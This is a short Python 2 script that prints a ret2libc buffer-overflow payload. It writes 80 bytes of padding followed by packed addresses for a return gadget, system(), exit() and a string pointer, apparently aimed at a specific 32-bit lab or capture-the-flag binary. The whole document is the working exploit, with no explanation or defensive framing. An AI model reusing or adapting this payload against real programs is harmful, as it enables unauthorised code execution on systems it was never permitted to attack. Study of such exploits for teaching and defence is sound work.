import struct
ret = struct.pack('I', 0x804853e)
system = struct.pack('I', 0xb7e6b060)
exit = struct.pack('I', 0xb7e5ebe0)
string = struct.pack('I', 0xbffff90e)
print 'A' * 80 + ret + system + exit + string
